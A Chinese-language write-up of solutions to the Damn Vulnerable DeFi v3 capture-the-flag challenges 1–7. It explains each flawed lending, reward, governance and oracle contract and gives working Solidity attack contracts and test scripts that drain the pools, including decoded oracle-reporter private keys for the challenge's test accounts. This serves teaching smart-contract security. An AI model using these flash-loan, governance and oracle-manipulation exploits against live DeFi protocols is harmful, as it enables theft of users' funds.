---
title: Damn Vulnerable DeFi V3
tags:
    - blockchain
    - smart contract
    - DeFi
    - flashloan
    - hardhat
    - foundry
---

## How to Play

### Hardhat

```bash
$ git clone git@github.com:tinchoabbate/damn-vulnerable-defi.git
$ cd damn-vulnerable-defi
$ git checkout v3.0.0
$ yarn install
```

- Code solution in the `test/<challenge-name>/<challenge-name>.challenge.js`
- `yarn run <challenge-name>`

### Foundry

```bash
$ git clone git@github.com:StErMi/forge-damn-vulnerable-defi.git
$ cd forge-damn-vulnerable-defi
$ git submodule update --init --recursive
$ forge remappings
```

- Code solution under the `src/test`
- `forge test --match-contract <test-contract-name>`

## 1. Unstoppable

> There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
>
> To pass the challenge, make the vault stop offering flash loans.
>
> You start with 10 DVT tokens in balance.

- ERC4626 实现 ERC20 作为股权代币，`asset` 为 Vault 管理的底层代币
- `UnstoppableVault` 初始持有 $10^6$ DVT (ERC20) 和 $10^6$ oDVT (ERC4626)

    ```js
    // unstoppable.challenge.js
    const TOKENS_IN_VAULT = 1000000n * 10n ** 18n;

    await token.approve(vault.address, TOKENS_IN_VAULT);
    await vault.deposit(TOKENS_IN_VAULT, deployer.address);
    ```

    ```js
    // ERC4626.sol
    function convertToShares(uint256 assets) public view virtual returns (uint256) {
        uint256 supply = totalSupply;   // the totalSupply of oDVT
        // 当初始 totalSupply 为 0 时，deposit assets 得到同等数量的 shares
        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());
        // (assets * supply) / totalAssets()
    }

    function previewDeposit(uint256 assets) public view virtual returns (uint256) {
        return convertToShares(assets);
    }

    function deposit(uint256 assets, address receiver) public virtual returns (uint256 shares) {
        require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

        // Need to transfer before minting or ERC777s could reenter.
        asset.safeTransferFrom(msg.sender, address(this), assets);

        _mint(receiver, shares);

        emit Deposit(msg.sender, receiver, assets, shares);

        afterDeposit(assets, shares);
    }
    ```

- 注意到 `convertToShares(totalSupply) != balanceBefore` 在使用依据 `totalSupply`(oDVT) 计算得到的 `shares` 和 `totalAssets()`(`UnstoppableVault` 的 DVT 余额) 进行比较，尽管在初始情况下没有问题，但是... (⃔ *`ω´ * )⃕↝
    - `totalSupply` 只能通过 `deposit` / `mint` 增加，而 `balanceBefore` 可通过 DVT 的 `transfer` 增加
    - 要将 `totalSupply` 转换成 `assets` 应使用 `convertToAssets`

    ```js
    // ReentrancyGuard.sol
    modifier nonReentrant() virtual {
        require(locked == 1, "REENTRANCY");

        locked = 2;

        _;

        locked = 1;
    }
    ```

    ```js
    // UnstoppableVault.sol
    function totalAssets() public view override returns (uint256) {
        assembly {
            // slot 0 对应 ReentrancyGuard 中的 locked
            if eq(sload(0), 2) {
                mstore(0x00, 0xed3ba6a6)
                revert(0x1c, 0x04)
            }
        }
        return asset.balanceOf(address(this));
    }

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address _token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool) {
        if (amount == 0) revert InvalidAmount(0);
        if (address(asset) != _token) revert UnsupportedCurrency();
        uint256 balanceBefore = totalAssets();
        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();

        uint256 fee = flashFee(_token, amount);
        // SafeERC20 wrappers around ERC20 operations that throw on failure
        ERC20(_token).safeTransfer(address(receiver), amount);

        if (receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data) != keccak256("IERC3156FlashBorrower.onFlashLoan"))
            revert CallbackFailed();

        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);
        return true;
    }
    ```

- 向 `UnstoppableVault` 发送 DVT 使得 `convertToShares(totalSupply) == balanceBefore` 无法成立就可以阻止闪电贷啦 XD

    ```js
    it('Execution', async function () {
        // get the contracts with player as signer
        token = token.connect(player);

        await token.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);
    });
    ```

### 参考资料

- [ERC4626](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC4626)
- [BigInt - JavaScript | MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/BigInt)

## 2. Naive Receiver

> There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
> 
> A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
> 
> Take all ETH out of the user’s contract. If possible, in a single transaction.

`FlashLoanReceiver.onFlashLoan()` 没有检查闪电贷的发起者 uwu 只好「帮」`FlashLoanReceiver` 发起闪电贷来消耗余额啦 :D

```js
// FlashLoanReceiver.sol
function onFlashLoan(
    address,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata
) external returns (bytes32) {
    assembly { // gas savings
        if iszero(eq(sload(pool.slot), caller())) {
            mstore(0x00, 0x48f5c3ed)
            revert(0x1c, 0x04)
        }
    }
    
    if (token != ETH) revert UnsupportedCurrency();
    
    uint256 amountToBeRepaid;
    unchecked {
        amountToBeRepaid = amount + fee;
    }

    _executeActionDuringFlashLoan();

    SafeTransferLib.safeTransferETH(pool, amountToBeRepaid);

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

### Exploit

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";

contract NaiveReceiverHacker {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function exploit(address pool, address receiver) external {
        for (uint8 i = 0; i < 10; i ++) {
            IERC3156FlashLender(pool).flashLoan(
                IERC3156FlashBorrower(receiver), // receiver
                ETH,                             // token
                1 ether,                         // amount
                ""                               // data
            );
        }
    }
}
```

```js
it('Execution', async function () {
    let hacker = await (await ethers.getContractFactory("NaiveReceiverHacker")).deploy();
    await hacker.exploit(pool.address, receiver.address);
});
```

## 3. Truster

> The pool holds 1 million DVT tokens. You have nothing.
>
> To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

- `target.functionCall(data)` 可以以 `TrusterLenderPool` 的身份调用任意合约的任意函数

    ```js
    // TrusterLenderPool.sol
    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
    ```

- 那就授权 `player` 使用 DVT 好了！(ΦˋωˊΦ)

    ```js
    it('Execution', async function () {
        let abi = ["function approve(address spender, uint256 amount)"];
        let iface = new ethers.utils.Interface(abi);
        await pool.connect(player).flashLoan(
            0,
            player.address,
            token.address,
            iface.encodeFunctionData("approve", [
                player.address,
                TOKENS_IN_POOL
            ]),
        );
        await token.connect(player).transferFrom(pool.address, player.address, TOKENS_IN_POOL);
    });
    ```

### 参考资料

- [encodeABI to get call data with encoded parameters of contract method · Issue #478 · ethers-io/ethers.js](https://github.com/ethers-io/ethers.js/issues/478#issuecomment-495814010)

## 4. Side Entrance

> A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.
>
> It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
>
> Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.

- `flashLoan()` 检查借贷前后 `SideEntranceLenderPool` 的余额，而 `deposit` 能够增加其余额并为 `msg.sender` 记账
- 可在 `flashLoan()` 时 `deposit()`，结束后 `withdraw()`

```js
// SideEntranceLenderPool.sol
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function withdraw() external {
    uint256 amount = balances[msg.sender];
    
    delete balances[msg.sender];
    emit Withdraw(msg.sender, amount);

    SafeTransferLib.safeTransferETH(msg.sender, amount);
}

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore)
        revert RepayFailed();
}
```

### Exploit

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SideEntranceLenderPool.sol";

contract SideEntranceHacker is IFlashLoanEtherReceiver {

    SideEntranceLenderPool pool;

    constructor(address instance) {
        pool = SideEntranceLenderPool(instance);
    }

    function exploit() external payable {
        pool.flashLoan(1000 ether);
        pool.withdraw();
        payable(tx.origin).transfer(1000 ether);
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    receive() external payable {}
}
```

```js
it('Execution', async function () {
    let hacker = await (await ethers.getContractFactory('SideEntranceHacker', player)).deploy(pool.address);
    await hacker.exploit();
});
```

## 5. The Rewarder

> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
>
> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
>
> You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
>
> By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

- `rewardToken` 的分发取决于最后一次快照

    ```js
    function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }
    ```

- 每 $5$ 天可以快照一次

    ```js
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;

    function _recordSnapshot() private {
            lastSnapshotIdForRewards = uint128(accountingToken.snapshot());
            lastRecordedSnapshotTimestamp = uint64(block.timestamp);
            unchecked {
                ++roundNumber;
            }
        }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
    ```

- 由于不检查 `deposit/withdraw` 的时间，可在 $5$ 天后借助闪电贷 `deposit()` 创建新的快照并获得 `rewardToken`，再 `withdraw()` 归还闪电贷

    ```js
    function deposit(uint256 amount) external {
        if (amount == 0) {
            revert InvalidDepositAmount();
        }

        accountingToken.mint(msg.sender, amount);
        distributeRewards();

        SafeTransferLib.safeTransferFrom(
            liquidityToken,
            msg.sender,
            address(this),
            amount
        );
    }

    function withdraw(uint256 amount) external {
        accountingToken.burn(msg.sender, amount);
        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
    }
    ```

### Exploit

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract TheRewarderHacker {
    TheRewarderPool public immutable pool;
    IERC20 public immutable dvt;

    constructor(address instance, address token) {
        pool = TheRewarderPool(instance);
        dvt = IERC20(token);
    }

    function exploit(address lender, address token) external {
        FlashLoanerPool(lender).flashLoan(1000000 ether);
        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        dvt.approve(address(pool), amount);
        pool.deposit(amount);
        pool.withdraw(amount);
        dvt.transfer(msg.sender, amount);
    }
}
```

```js
it('Execution', async function () {
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    const TheRewarderHackerFactory = await ethers.getContractFactory('TheRewarderHacker', player);
    const theRewarderHacker = await TheRewarderHackerFactory.deploy(rewarderPool.address, liquidityToken.address);

    await theRewarderHacker.exploit(flashLoanPool.address, rewardToken.address);
});
```

### 参考资料

- [ERC20Snapshot](https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot)

## 6. Selfie

> A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.
>
> You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.

- `governance` 才能调用 `emergencyExit()` 转出 pool 中的资金

    ```js
    modifier onlyGovernance() {
        if (msg.sender != address(governance))
            revert CallerNotGovernance();
        _;
    }

    function emergencyExit(address receiver) external onlyGovernance {
        uint256 amount = token.balanceOf(address(this));
        token.transfer(receiver, amount);

        emit FundsDrained(receiver, amount);
    }
    ```

- `SimpleGovernance.executeAction()` 可以执行自定义调用

    ```js
    function executeAction(uint256 actionId) external payable returns (bytes memory) {
        if(!_canBeExecuted(actionId))
            revert CannotExecute(actionId);

        GovernanceAction storage actionToExecute = _actions[actionId];
        actionToExecute.executedAt = uint64(block.timestamp);

        emit ActionExecuted(actionId, msg.sender);

        (bool success, bytes memory returndata) = actionToExecute.target.call{value: actionToExecute.value}(actionToExecute.data);
        if (!success) {
            if (returndata.length > 0) {
                assembly {
                    revert(add(0x20, returndata), mload(returndata))
                }
            } else {
                revert ActionFailed(actionId);
            }
        }

        return returndata;
    }
    ```

- 创建新的 action 需要创建者获取足够的票数，票数即创建者在最新快照 `governanceToken` 的持有量

    ```js
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) {
        if (!_hasEnoughVotes(msg.sender))
            revert NotEnoughVotes(msg.sender);

        if (target == address(this))
            revert InvalidTarget();
        
        if (data.length > 0 && target.code.length == 0)
            revert TargetMustHaveCode();

        actionId = _actionCounter;

        _actions[actionId] = GovernanceAction({
            target: target,
            value: value,
            proposedAt: uint64(block.timestamp),
            executedAt: 0,
            data: data
        });

        unchecked { _actionCounter++; }

        emit ActionQueued(actionId, msg.sender);
    }

    function _hasEnoughVotes(address who) private view returns (bool) {
        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);
        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;
        return balance > halfTotalSupply;
    }
    ```

- 任何人都可以进行快照 uwu 那么在闪电贷时快照，即可获得充足的票数，在下一次快照前 `queueAction()` 就可以啦w

    ```js
    function snapshot() public returns (uint256 lastSnapshotId) {
        lastSnapshotId = _snapshot();
        _lastSnapshotId = lastSnapshotId;
    }
    ```

### Exploit

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieHack is IERC3156FlashBorrower {

    function exploit(address instance, address pool) external returns (uint actionId) {
        SelfiePool(pool).flashLoan(
            this,
            address(SelfiePool(pool).token()),
            1500000 ether,
            ""
        );
        actionId = ISimpleGovernance(instance).queueAction(
            pool,
            0,
            abi.encodeWithSignature("emergencyExit(address)", msg.sender)
        );
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();
        DamnValuableTokenSnapshot(token).approve(msg.sender, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
```

#### Hardhat

```js
it('Execution', async function () {
    const SelfieHack = await (await ethers.getContractFactory('SelfieHack', player)).deploy();
    // The return value of a non-pure non-view function is available only when the function is called and validated on-chain.
    await SelfieHack.exploit(governance.address, pool.address); 

    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
    await governance.executeAction(await governance.getActionCounter() - 1);
});
```

#### Foundry

```js
function exploit() internal override {
    // Sets attacker as msg.sender for all subsequent calls until stopPrank is called
    vm.startPrank(attacker);

    SelfieHack hack = new SelfieHack();
    uint actionId = hack.exploit(address(governance), address(pool));

    vm.stopPrank();

    skip(governance.getActionDelay()); // 2 days
    governance.executeAction(actionId);
}
```

## 7. Compromised

> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. Here’s a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

> A related on-chain exchange is selling (absurdly overpriced) collectibles called “DVNFT”, now at 999 ETH each.
>
> This price is fetched from an on-chain oracle, based on 3 trusted reporters: 0xA732...A105,0xe924...9D15 and 0x81A5...850c.
>
> Starting with just 0.1 ETH in balance, pass the challenge by obtaining all ETH available in the exchange.

- 对返回数据先十六进制解码再 Base64 解码得到其中两个 reporter 的私钥
- DVNFT 的价格取决于 reporters 提供价格的中位数

    ```js
    function getMedianPrice(string calldata symbol) external view returns (uint256) {
        return _computeMedianPrice(symbol);
    }

    function _computeMedianPrice(string memory symbol) private view returns (uint256) {
        uint256[] memory prices = getAllPricesForSymbol(symbol);
        LibSort.insertionSort(prices);
        if (prices.length % 2 == 0) {
            uint256 leftPrice = prices[(prices.length / 2) - 1];
            uint256 rightPrice = prices[prices.length / 2];
            return (leftPrice + rightPrice) / 2;
        } else {
            return prices[prices.length / 2];
        }
    }

    function getAllPricesForSymbol(string memory symbol) public view returns (uint256[] memory prices) {
        uint256 numberOfSources = getRoleMemberCount(TRUSTED_SOURCE_ROLE);
        prices = new uint256[](numberOfSources);
        for (uint256 i = 0; i < numberOfSources;) {
            address source = getRoleMember(TRUSTED_SOURCE_ROLE, i);
            prices[i] = getPriceBySource(symbol, source);
            unchecked { ++i; }
        }
    }

    function getPriceBySource(string memory symbol, address source) public view returns (uint256) {
        return _pricesBySource[source][symbol];
    }
    ```

- 在持有两个 reporters 私钥的情况下可以很轻松地操控价格

    ```js
    function postPrice(string calldata symbol, uint256 newPrice) external onlyRole(TRUSTED_SOURCE_ROLE) {
        _setPrice(msg.sender, symbol, newPrice);
    }
    ```

- 先降低价格购买 NFT，再提高价格卖出

### Exploit

#### Hardhat

```js
it('Execution', async function () {
    const resp = [
        '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35',
        '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34',
    ];
    let signers = [];
    for (let i = 0; i < 2; i ++) {
        signers.push(new ethers.Wallet(
            Buffer.from(Buffer.from(resp[i].split(' ').join(''), 'hex').toString('utf8'), 'base64').toString('utf8'),
            ethers.provider
        ));
        await oracle.connect(signers[i]).postPrice('DVNFT', 0);
    }

    // get tokenId from the event
    let tx = await exchange.connect(player).buyOne({ value: 1 }); // (msg.value - price) will be send back
    let receipt = await tx.wait();
    let id = receipt.events.filter(
        (x) => {return x.event == "TokenBought"}
        )[0].args.tokenId;

    for (let i = 0; i < 2; i ++) {
        oracle.connect(signers[i]).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
    }
    await nftToken.connect(player).approve(exchange.address, id);
    await exchange.connect(player).sellOne(id);
});
```

#### Foundry

```js
function exploit() internal override {
    address[] memory users = new address[](2);
    users[0] = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9);
    users[1] = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48);

    for (uint8 i = 0; i < 2; i ++) {
        vm.prank(users[i]);
        oracle.postPrice('DVNFT', 0);
    }

    vm.prank(attacker);
    uint id = exchange.buyOne{ value: 1 }();

    for (uint8 i = 0; i < 2; i ++) {
        vm.prank(users[i]);
        oracle.postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
    }

    vm.startPrank(attacker);
    nftToken.approve(address(exchange), id);
    exchange.sellOne(id);
    vm.stopPrank();
}
```